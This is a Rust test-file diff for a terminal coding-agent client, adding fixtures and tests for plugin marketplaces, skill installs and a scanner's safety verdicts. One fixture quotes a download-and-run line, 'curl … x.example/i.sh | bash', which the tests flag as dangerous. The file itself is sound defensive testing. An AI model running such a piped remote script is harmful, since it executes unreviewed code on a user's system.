@@ -103,6 +103,7 @@ fn sample_model(name: &str, size: f64, fit: GpuFit, tools: bool) -> WelcomeModel
         needs_key: false,
         price: None,
         kv_bytes_per_token: None,
+        details: recode_core::model_facts::ModelFacts::default(),
     }
 }
 
@@ -185,6 +186,23 @@ fn sample_extensions() -> ExtensionsSnapshot {
             skill("borrowed", SkillSource::ClaudeCode, true, None),
             skill("damaged", SkillSource::User, false, Some("Has no description in its front matter.")),
         ],
+        plugins: vec![
+            sample_plugin("context7", "claude-plugins-official", true),
+            sample_plugin("better-session-appearance", "community", false),
+        ],
+        marketplaces: vec![recode_core::extensions::Marketplace {
+            name: "claude-plugins-official".to_owned(),
+            repo: "anthropics/claude-plugins-official".to_owned(),
+            sha: "2c5958ecac7cee2b583967a2c4981d0f4a75c579".to_owned(),
+            added_at: "2026-11-08T03:00:00Z".to_owned(),
+            plugin_count: 317,
+        }],
+        claude_plugins: vec![recode_core::extensions::ClaudePluginInfo {
+            key: "rust-analyzer-lsp@claude-plugins-official".to_owned(),
+            version: Some("1.0.0".to_owned()),
+            install_path: "/home/someone/.claude/plugins/cache/claude-plugins-official/rust-analyzer-lsp/1.0.0"
+                .to_owned(),
+        }],
         providers: vec![
             parse_provider_form("anthropic", ProviderKind::Anthropic, "", true).unwrap(),
             parse_provider_form("openrouter", ProviderKind::OpenaiCompatible, "https://openrouter.ai/api/v1", true)
@@ -208,6 +226,283 @@ fn sample_extensions() -> ExtensionsSnapshot {
         config_path: "/home/someone/.config/re-code/extensions.toml".to_owned(),
         load_error: None,
     }
+}
+
+/// An installed plugin: `context7` brings an MCP server, a command and a converted hook; the other
+/// is a Hermes desktop plugin with nothing that runs here.
+fn sample_plugin(name: &str, label: &str, runs: bool) -> recode_core::extensions::Plugin {
+    use recode_core::extensions::{InstalledSource, Plugin, PluginPart, Verdict};
+    let parts = if runs {
+        vec![
+            PluginPart::Mcp { name: "context7".to_owned(), connection: "https://mcp.context7.com/mcp".to_owned() },
+            PluginPart::Skill {
+                name: "setup".to_owned(),
+                path: "commands/setup.md".to_owned(),
+                scan: Verdict::Clean,
+                command: true,
+            },
+            PluginPart::Hook { event: "session_start".to_owned(), command: "bash hi.sh".to_owned(), converted: true },
+        ]
+    } else {
+        vec![
+            PluginPart::NotRunHere {
+                what: "Python plugin code (tools, hooks or middleware for Hermes Agent)".to_owned(),
+                detail: String::new(),
+            },
+            PluginPart::NotRunHere { what: "desktop plugin (Hermes app interface)".to_owned(), detail: String::new() },
+        ]
+    };
+    Plugin {
+        name: name.to_owned(),
+        description: if runs {
+            "Upstash Context7 MCP server for up-to-date documentation lookup.".to_owned()
+        } else {
+            "Set a color for each session and show an idle glyph.".to_owned()
+        },
+        version: Some(if runs { "1.0.0" } else { "1.2.4" }.to_owned()),
+        maintainer: Some(if runs { "Upstash" } else { "apoapostolov" }.to_owned()),
+        label: label.to_owned(),
+        source: InstalledSource {
+            tap: if runs { format!("{name}@{label}") } else { name.to_owned() },
+            repo: if runs { "anthropics/claude-plugins-official" } else { "apoapostolov/hermes-agent-awesome-plugins" }
+                .to_owned(),
+            path: if runs { "external_plugins/context7" } else { "public/better-session-appearance" }.to_owned(),
+            sha: if runs {
+                "2c5958ecac7cee2b583967a2c4981d0f4a75c579"
+            } else {
+                "3ee270029f9d13a0997215f09294c1e02a1f28ae"
+            }
+            .to_owned(),
+            label: label.to_owned(),
+            installed_at: "2026-11-08T03:00:00Z".to_owned(),
+        },
+        directory: format!("/home/someone/.local/share/re-code/plugins/{name}"),
+        enabled: true,
+        parts,
+    }
+}
+
+/// The install window showing a staged plugin.
+fn plugin_preview() -> App {
+    use recode_core::extensions::{PluginOutcome, PluginPreview};
+    let mut app = home_on(HomeTab::Plugins, sample_extensions());
+    let actions = app.open_plugin_install(Some("better-session-appearance".to_owned()));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::StagePlugin(tap))] if tap == "better-session-appearance")
+    );
+    let preview = PluginPreview {
+        staging: "/home/someone/.cache/re-code/hub/staging/p1/better-session-appearance".to_owned(),
+        plugin: sample_plugin("better-session-appearance", "community", false),
+        files: 8,
+        bytes: 1_500_000,
+        location: "/home/someone/.local/share/re-code/plugins/better-session-appearance".to_owned(),
+        note: None,
+        replaces: None,
+    };
+    app.plugin_outcome(PluginOutcome::Preview(Box::new(preview)));
+    app
+}
+
+/// A marketplace listing with a refused entry.
+fn plugin_browse() -> App {
+    use recode_core::extensions::PluginListing;
+    let mut app = home_on(HomeTab::Plugins, sample_extensions());
+    let actions = app.browse_plugins("claude-plugins-official");
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::BrowseMarketplace(name))] if name == "claude-plugins-official")
+    );
+    let listings = vec![
+        PluginListing {
+            tap: "context7@claude-plugins-official".to_owned(),
+            name: "context7".to_owned(),
+            description: "Upstash Context7 MCP server for documentation lookup.".to_owned(),
+            label: "development".to_owned(),
+            version: None,
+            unsupported: None,
+        },
+        PluginListing {
+            tap: "frontend-design@claude-plugins-official".to_owned(),
+            name: "frontend-design".to_owned(),
+            description: "Frontend design skill for UI/UX implementation".to_owned(),
+            label: "development".to_owned(),
+            version: Some("1.1.1".to_owned()),
+            unsupported: None,
+        },
+        PluginListing {
+            tap: "npm-thing@claude-plugins-official".to_owned(),
+            name: "npm-thing".to_owned(),
+            description: "From npm.".to_owned(),
+            label: "tools".to_owned(),
+            version: None,
+            unsupported: Some("this source runs code on install, which re-code never does".to_owned()),
+        },
+    ];
+    app.plugin_listings("claude-plugins-official", listings, None);
+    app
+}
+
+#[test]
+fn saved_chats_can_be_deleted_from_home_and_the_picker_after_a_confirmation() {
+    use recode_tui::link::SessionSummary;
+    let sessions = vec![
+        SessionSummary {
+            id: "s-1".to_owned(),
+            title: "fix the retry loop".to_owned(),
+            age: "just now".to_owned(),
+            messages: 4,
+        },
+        SessionSummary { id: "s-2".to_owned(), title: "hello".to_owned(), age: "1 hour ago".to_owned(), messages: 11 },
+    ];
+    let mut app = App::new(Instant::now(), "api-server", "", "", false);
+    app.reduced_motion = true;
+    app.open_welcome();
+    app.set_welcome_info(sample_info());
+    app.sessions_listed(sessions.clone());
+    if let Screen::Welcome(welcome) = &mut app.screen {
+        welcome.tab = HomeTab::Home;
+    }
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(text.contains("fix the retry loop") && text.contains("d delete chat"), "{text}");
+    app.handle_key(KeyEvent::new(KeyCode::Down, KeyModifiers::NONE));
+    assert!(app.handle_key(KeyEvent::new(KeyCode::Char('d'), KeyModifiers::NONE)).is_empty());
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(text.contains("Delete this chat?") && text.contains("hello · 1 hour ago · 11 messages"), "{text}");
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE));
+    assert!(matches!(actions.as_slice(), [Action::DeleteSession(id)] if id == "s-2"), "{actions:?}");
+    assert!(app.overlay.is_none());
+    // The driver answers with the shorter list.
+    app.sessions_listed(sessions[..1].to_vec());
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(!text.contains("hello · 1 hour ago"), "{text}");
+    // From the picker: d asks, y deletes, and the picker comes back with the fresh list.
+    app.show_sessions(sessions.clone());
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(text.contains("Sessions in this folder") && text.contains("d delete"), "{text}");
+    app.handle_key(KeyEvent::new(KeyCode::Char('d'), KeyModifiers::NONE));
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE));
+    assert!(matches!(actions.as_slice(), [Action::DeleteSession(id)] if id == "s-1"), "{actions:?}");
+    app.sessions_listed(sessions[1..].to_vec());
+    assert!(
+        matches!(&app.overlay, Some(Overlay::Sessions { sessions, .. }) if sessions.len() == 1),
+        "{:?}",
+        app.overlay
+    );
+}
+
+#[test]
+fn the_plugins_tab_lists_installs_and_the_install_window_decides() {
+    let mut app = home_on(HomeTab::Plugins, sample_extensions());
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(text.contains("context7") && text.contains("claude-plugins-official @ 2c5958ec · 2 parts"), "{text}");
+    assert!(text.contains("better-session-appea") && text.contains("nothing runs here"), "{text}");
+    assert!(text.contains("⌂ claude-plugins-official") && text.contains("marketplace · 317 plugins"), "{text}");
+    assert!(
+        text.contains("◇ rust-analyzer-lsp@claude-plugi") && text.contains("installed in Claude Code 1.0.0"),
+        "{text}"
+    );
+    assert!(text.contains("MCP server context7") && text.contains("hook on session_start · converted, not"), "{text}");
+    // Space switches the selected plugin; d asks before removing; u checks for an update.
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Char(' '), KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::SetPluginEnabled(name, false))] if name == "context7"),
+        "{actions:?}"
+    );
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Char('u'), KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::UpdatePlugin(name))] if name == "context7"),
+        "{actions:?}"
+    );
+    app.handle_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
+    app.handle_key(KeyEvent::new(KeyCode::Char('d'), KeyModifiers::NONE));
+    assert!(
+        matches!(&app.overlay, Some(Overlay::Confirm(confirm)) if confirm.title.contains("context7")),
+        "{:?}",
+        app.overlay
+    );
+    app.handle_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
+    // On the marketplace row, b browses it and d stops following; on Claude's row, Enter brings it over.
+    app.handle_key(KeyEvent::new(KeyCode::Down, KeyModifiers::NONE));
+    app.handle_key(KeyEvent::new(KeyCode::Down, KeyModifiers::NONE));
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Char('b'), KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::BrowseMarketplace(name))] if name == "claude-plugins-official"),
+        "{actions:?}"
+    );
+    app.handle_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
+    app.handle_key(KeyEvent::new(KeyCode::Char('d'), KeyModifiers::NONE));
+    assert!(
+        matches!(&app.overlay, Some(Overlay::Confirm(confirm)) if confirm.body[0].contains("stops following")),
+        "{:?}",
+        app.overlay
+    );
+    app.handle_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
+    app.handle_key(KeyEvent::new(KeyCode::Down, KeyModifiers::NONE));
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::StagePlugin(tap))] if tap.ends_with("rust-analyzer-lsp/1.0.0")),
+        "{actions:?}"
+    );
+
+    // The preview reads like Hermes and y installs.
+    let mut app = plugin_preview();
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(
+        text.contains("better-session-appearance") && text.contains("community") && text.contains("pinned @ 3ee27002"),
+        "{text}"
+    );
+    assert!(text.contains("maintained by apoapostolov") && text.contains("nothing here runs in re-code"), "{text}");
+    assert!(text.contains("8 files") && text.contains("version 1.2.4") && text.contains("Enable now?"), "{text}");
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::CommitPlugin { enable: true, .. })]),
+        "{actions:?}"
+    );
+
+    // Browsing: typing filters, Enter on a refused entry explains, Enter on a good one installs.
+    let mut app = plugin_browse();
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(
+        text.contains("Marketplace claude-plugins-official")
+            && text.contains("frontend-design  1.1.1")
+            && text.contains("3 of 3"),
+        "{text}"
+    );
+    for c in "npm".chars() {
+        app.handle_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE));
+    }
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(text.contains("1 of 3") && text.contains("can't be installed: this source runs code"), "{text}");
+    assert!(app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE)).is_empty());
+    for _ in 0..3 {
+        app.handle_key(KeyEvent::new(KeyCode::Backspace, KeyModifiers::NONE));
+    }
+    app.handle_key(KeyEvent::new(KeyCode::Down, KeyModifiers::NONE));
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::StagePlugin(tap))] if tap == "frontend-design@claude-plugins-official"),
+        "{actions:?}"
+    );
+
+    // /plugin marketplace add from the conversation; m on the tab asks.
+    let mut app = App::new(Instant::now(), "api-server", "gpt-oss:20b", "", false);
+    app.input.insert("/plugin marketplace add anthropics/claude-plugins-official");
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::AddMarketplace(what))] if what == "anthropics/claude-plugins-official"),
+        "{actions:?}"
+    );
+    let mut app = home_on(HomeTab::Plugins, sample_extensions());
+    app.handle_key(KeyEvent::new(KeyCode::Char('m'), KeyModifiers::NONE));
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(text.contains("Follow a marketplace"), "{text}");
+    for c in "o/r".chars() {
+        app.handle_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE));
+    }
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::AddMarketplace(what))] if what == "o/r"),
+        "{actions:?}"
+    );
 }
 
 fn home_on(tab: HomeTab, extensions: ExtensionsSnapshot) -> App {
@@ -249,6 +544,21 @@ fn welcome_scenes() -> Vec<(&'static str, Option<WelcomeInfo>)> {
         model.size_gib = None;
         model.provider_label = Some(if free { "openrouter" } else { "openai" }.to_owned());
         model.free = free;
+        model.price = (!free).then_some((0.25, 2.0));
+        model.details = recode_core::model_facts::ModelFacts {
+            display_name: Some(if free { "Free Coder" } else { "GPT-5 mini" }.to_owned()),
+            description: Some(
+                "A compact model for agents and tool calling, with a long context and structured output. It \
+                 reasons before it answers. Prompts may be retained by the provider."
+                    .to_owned(),
+            ),
+            max_output: Some(32_000),
+            cached_price: (!free).then_some(0.025),
+            modalities: Some("text, image → text".to_owned()),
+            released: Some("2026-08-07".to_owned()),
+            knowledge: Some("2026-05".to_owned()),
+            ..recode_core::model_facts::ModelFacts::default()
+        };
         stopped_with_cloud.models.push(model);
     }
     let mut many = sample_info();
@@ -784,6 +1094,13 @@ fn every_scene() -> Vec<(&'static str, App)> {
     app.open_free_setup();
     scenes.push(("free setup pick", app));
 
+    scenes.push(("install caution", install_preview("caution")));
+    scenes.push(("install choose", install_choose()));
+    scenes.push(("skill search", skill_search()));
+    scenes.push(("plugins tab", home_on(HomeTab::Plugins, sample_extensions())));
+    scenes.push(("plugin preview", plugin_preview()));
+    scenes.push(("plugin browse", plugin_browse()));
+
     let mut app = finished();
     app.ledger = Some(recode_core::usage::Ledger {
         components: vec![
@@ -867,6 +1184,7 @@ fn every_scene() -> Vec<(&'static str, App)> {
                 tokens: 180,
                 trusted: true,
                 problem: None,
+                memory: None,
             },
             recode_tui::link::InstructionFileInfo {
                 scope: "project".into(),
@@ -874,6 +1192,7 @@ fn every_scene() -> Vec<(&'static str, App)> {
                 tokens: 2400,
                 trusted: false,
                 problem: None,
+                memory: None,
             },
             recode_tui::link::InstructionFileInfo {
                 scope: "project".into(),
@@ -881,6 +1200,15 @@ fn every_scene() -> Vec<(&'static str, App)> {
                 tokens: 12_000,
                 trusted: true,
                 problem: Some("48 KB is too long to send; only its path is mentioned".into()),
+                memory: None,
+            },
+            recode_tui::link::InstructionFileInfo {
+                scope: "remembered · project · feedback: Which package manager to use".into(),
+                path: "/home/someone/.local/share/re-code/memory/1a2b3c4d/fedora-commands.md".into(),
+                tokens: 40,
+                trusted: true,
+                problem: None,
+                memory: Some(("project".into(), "fedora-commands".into())),
             },
         ],
         "/home/someone/.config/re-code/RE-CODE.md".into(),
@@ -1293,6 +1621,249 @@ fn flagged_skills() -> ExtensionsSnapshot {
         ..Skill::default()
     });
     snapshot
+}
+
+/// A staged skill as the install window shows it: `clean`, `caution`, `dangerous` or `update`.
+fn install_preview(kind: &str) -> App {
+    use recode_core::extensions::{
+        Declares, Finding, InstallOutcome, InstallPreview, InstalledSource, Replacing, Severity, Verdict,
+    };
+    let mut app = home_on(HomeTab::Skills, sample_extensions());
+    let actions = app.open_install(Some("official/security/godmode".to_owned()));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::StageSkill(tap))] if tap == "official/security/godmode")
+    );
+    let finding = |file: &str, line: usize, reason: &str, excerpt: &str, severity| Finding {
+        file: file.to_owned(),
+        line,
+        reason: reason.to_owned(),
+        excerpt: excerpt.to_owned(),
+        severity,
+    };
+    let scan = match kind {
+        "clean" | "update" => Verdict::Clean,
+        "caution" => Verdict::Caution {
+            findings: vec![
+                finding(
+                    "SKILL.md",
+                    41,
+                    "runs a package installer, which executes code from the network",
+                    "pip install ruamel.yaml",
+                    Severity::Caution,
+                ),
+                finding(
+                    "link",
+                    0,
+                    "is a symbolic link, so it wasn't taken; the skill may expect it",
+                    "",
+                    Severity::Caution,
+                ),
+            ],
+        },
+        _ => Verdict::Dangerous {
+            findings: vec![finding(
+                "scripts/setup.sh",
+                3,
+                "downloads a script and runs it in one step, so what runs can change after review",
+                "curl -s https://x.example/i.sh | bash",
+                Severity::Dangerous,
+            )],
+        },
+    };
+    let preview = InstallPreview {
+        staging: "/home/someone/.cache/re-code/hub/staging/1a2b/godmode".to_owned(),
+        name: "godmode".to_owned(),
+        description: "Run security tooling with every safeguard explained. Use for authorised testing.".to_owned(),
+        source: InstalledSource {
+            tap: "official/security/godmode".to_owned(),
+            repo: "NousResearch/hermes-agent".to_owned(),
+            path: "optional-skills/security/godmode".to_owned(),
+            sha: "4134cbef0123456789abcdef0123456789abcdef".to_owned(),
+            label: "official".to_owned(),
+            installed_at: "2026-11-07T19:00:00Z".to_owned(),
+        },
+        files: (0..7).map(|i| format!("file{i}.md")).collect(),
+        bytes: 12_400,
+        estimated_tokens: 3400,
+        declares: if kind == "caution" {
+            Declares { allowed_tools: vec!["Bash".to_owned()], scripts: vec!["scripts/run.py".to_owned()], env_vars: vec!["GODMODE_TOKEN".to_owned()] }
+        } else {
+            Declares::default()
+        },
+        scan,
+        location: "/home/someone/.config/re-code/skills/godmode".to_owned(),
+        skill_text: "---\nname: godmode\ndescription: Run security tooling.\n---\n\n# godmode\n\nFirst run `pip install ruamel.yaml`.\n\nThen follow the steps below, one at a time, checking each result before the next.\n".to_owned(),
+        problem: None,
+        note: (kind == "caution").then(|| "skills.sh's API needs a login, so the files came from the GitHub repository it points at.".to_owned()),
+        replaces: (kind == "update").then(|| Replacing {
+            sha: "1111111111111111111111111111111111111111".to_owned(),
+            changed: vec!["~ SKILL.md".to_owned(), "+ notes.md".to_owned(), "- scripts/run.py".to_owned()],
+        }),
+    };
+    app.install_outcome(InstallOutcome::Preview(Box::new(preview)));
+    app
+}
+
+/// A repository holding several skills.
+fn install_choose() -> App {
+    use recode_core::extensions::{InstallOutcome, SkillCandidate};
+    let mut app = home_on(HomeTab::Skills, sample_extensions());
+    app.open_install(Some("anthropics/skills".to_owned()));
+    let candidates = ["pdf", "xlsx", "docx", "pptx", "frontend-design"]
+        .iter()
+        .map(|name| SkillCandidate {
+            tap: format!("anthropics/skills/skills/{name}@2c5958ecac7cee2b583967a2c4981d0f4a75c579"),
+            path: format!("skills/{name}"),
+            name: (*name).to_owned(),
+            description: format!("Work with {name} files, from reading to creating them."),
+        })
+        .collect();
+    app.install_outcome(InstallOutcome::Choose { tap: "anthropics/skills".to_owned(), candidates, note: None });
+    app
+}
+
+/// The hub search with results.
+fn skill_search() -> App {
+    use recode_core::extensions::SkillSearchHit;
+    let mut app = home_on(HomeTab::Skills, sample_extensions());
+    app.handle_key(KeyEvent::new(KeyCode::Char('s'), KeyModifiers::NONE));
+    for c in "pdf".chars() {
+        app.handle_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE));
+    }
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
+    assert!(matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::SearchSkills(q))] if q == "pdf"));
+    let hits = vec![
+        SkillSearchHit {
+            tap: "hermes/github/anthropics/skills/pdf".to_owned(),
+            name: "pdf".to_owned(),
+            description: "Work with PDF files.".to_owned(),
+            label: "community".to_owned(),
+            repo: "anthropics/skills".to_owned(),
+            path: "skills/pdf".to_owned(),
+        },
+        SkillSearchHit {
+            tap: "hermes/official/documents/pdf-forms".to_owned(),
+            name: "pdf-forms".to_owned(),
+            description: "Fill PDF forms from structured data.".to_owned(),
+            label: "official".to_owned(),
+            repo: "NousResearch/hermes-agent".to_owned(),
+            path: "optional-skills/documents/pdf-forms".to_owned(),
+        },
+    ];
+    app.skill_search_result("pdf", hits, None, None);
+    app
+}
+
+#[test]
+fn installing_a_skill_shows_the_preview_and_takes_the_decision() {
+    use recode_core::extensions::InstallOutcome;
+    let mut app = install_preview("caution");
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(text.contains("godmode") && text.contains("official") && text.contains("pinned @ 4134cbef"), "{text}");
+    assert!(
+        text.contains("asks for tools: Bash") && text.contains("7 files") && text.contains("3.4k tokens"),
+        "{text}"
+    );
+    assert!(text.contains("scan: caution") && text.contains("SKILL.md:41"), "{text}");
+    assert!(text.contains("skills/godmode") && text.contains("Enable now?"), "{text}");
+    // Reading SKILL.md and coming back.
+    app.handle_key(KeyEvent::new(KeyCode::Char('r'), KeyModifiers::NONE));
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(text.contains("SKILL.md · godmode") && text.contains("checking each result"), "{text}");
+    app.handle_key(KeyEvent::new(KeyCode::Char('r'), KeyModifiers::NONE));
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::CommitInstall { staging, enable: true })] if staging.ends_with("/godmode")),
+        "{actions:?}"
+    );
+    assert!(app.overlay.is_none());
+
+    // Dangerous: y does nothing, k keeps it off, n discards.
+    let mut app = install_preview("dangerous");
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(text.contains("dangerous") && text.contains("Keep it, off?") && !text.contains("y yes"), "{text}");
+    assert!(app.handle_key(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE)).is_empty());
+    assert!(app.overlay.is_some());
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Char('k'), KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::CommitInstall { enable: false, .. })]),
+        "{actions:?}"
+    );
+    let mut app = install_preview("clean");
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Char('n'), KeyModifiers::NONE));
+    assert!(matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::DiscardInstall(_))]), "{actions:?}");
+
+    // An update names what changes.
+    let mut app = install_preview("update");
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(
+        text.contains("Update godmode") && text.contains("Update from 11111111") && text.contains("+ notes.md"),
+        "{text}"
+    );
+
+    // Picking from several skills fetches the pinned one.
+    let mut app = install_choose();
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(text.contains("holds 5 skills") && text.contains("frontend-design"), "{text}");
+    app.handle_key(KeyEvent::new(KeyCode::Down, KeyModifiers::NONE));
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::StageSkill(tap))] if tap.starts_with("anthropics/skills/skills/xlsx@")),
+        "{actions:?}"
+    );
+
+    // A search hit installs; a failure is shown; closing the window while fetching discards what arrives.
+    let mut app = skill_search();
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(
+        text.contains("pdf-forms") && text.contains("official") && text.contains("anthropics/skills/skills/pdf"),
+        "{text}"
+    );
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::StageSkill(tap))] if tap == "hermes/github/anthropics/skills/pdf"),
+        "{actions:?}"
+    );
+    app.install_outcome(InstallOutcome::Failed {
+        tap: "x".to_owned(),
+        error: "GitHub has no x/y, or it's private.".to_owned(),
+    });
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(text.contains("or it's private"), "{text}");
+    app.handle_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
+    assert!(app.overlay.is_none());
+    app.open_install(Some("o/r".to_owned()));
+    app.handle_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
+    let preview = recode_core::extensions::InstallPreview { staging: "/tmp/staged/x".to_owned(), ..Default::default() };
+    app.install_outcome(InstallOutcome::Preview(Box::new(preview)));
+    assert!(
+        matches!(app.pending_actions.as_slice(), [Action::Extension(ExtensionCommand::DiscardInstall(s))] if s == "/tmp/staged/x")
+    );
+
+    // From the conversation: /skill install <what>, and u on an installed skill. (The demo recording refuses it.)
+    let mut app = App::new(Instant::now(), "api-server", "gpt-oss:20b", "", false);
+    app.input.insert("/skill install anthropics/skills/skills/pdf");
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::StageSkill(tap))] if tap == "anthropics/skills/skills/pdf"),
+        "{actions:?}"
+    );
+    let mut snapshot = sample_extensions();
+    snapshot.skills[0].installed_from = Some(recode_core::extensions::InstalledSource {
+        tap: "official/x/y".to_owned(),
+        sha: "4134cbef0123456789abcdef0123456789abcdef".to_owned(),
+        label: "official".to_owned(),
+        ..Default::default()
+    });
+    let name = snapshot.skills[0].name.clone();
+    let mut app = home_on(HomeTab::Skills, snapshot);
+    let text = screen(&draw(&mut app, 120, 36));
+    assert!(text.contains("official @ 4134cbef"), "{text}");
+    let actions = app.handle_key(KeyEvent::new(KeyCode::Char('u'), KeyModifiers::NONE));
+    assert!(
+        matches!(actions.as_slice(), [Action::Extension(ExtensionCommand::UpdateSkill(n))] if *n == name),
+        "{actions:?}"
+    );
 }
 
 #[test]
@@ -1741,6 +2312,14 @@ fn snapshots_at_typical_sizes() {
         snapshot("runtimes_tab", &mut runtimes_tab(), width, height);
         snapshot("mcp_search", &mut mcp_search(), width, height);
         snapshot("skills_flagged", &mut home_on(HomeTab::Skills, flagged_skills()), width, height);
+        snapshot("install_clean", &mut install_preview("clean"), width, height);
+        snapshot("install_caution", &mut install_preview("caution"), width, height);
+        snapshot("install_dangerous", &mut install_preview("dangerous"), width, height);
+        snapshot("install_choose", &mut install_choose(), width, height);
+        snapshot("skill_search", &mut skill_search(), width, height);
+        snapshot("plugins_tab", &mut home_on(HomeTab::Plugins, sample_extensions()), width, height);
+        snapshot("plugin_preview", &mut plugin_preview(), width, height);
+        snapshot("plugin_browse", &mut plugin_browse(), width, height);
     }
 }
 
